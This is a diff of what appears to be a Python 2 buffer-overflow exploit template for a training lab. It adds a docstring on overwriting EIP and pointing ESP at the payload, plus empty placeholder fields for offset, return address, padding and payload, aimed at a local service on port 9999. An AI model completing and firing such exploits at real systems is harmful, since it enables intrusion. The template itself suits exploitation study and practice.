@@ -2,11 +2,25 @@
 #https://github.com/gh0x0st
 #gh0x0st@protonmail.com
 
+'''
+Crash the application using this buffer, and make sure that EIP is overwritten by B's (\x42) and that the ESP register points to the start of the C's (\x43).
+'''
+
+
 import socket,sys
 
 address = '127.0.0.1'
 port = 9999
-buffer = #TBD
+
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
 
 try:
 	print '[+] Sending buffer'
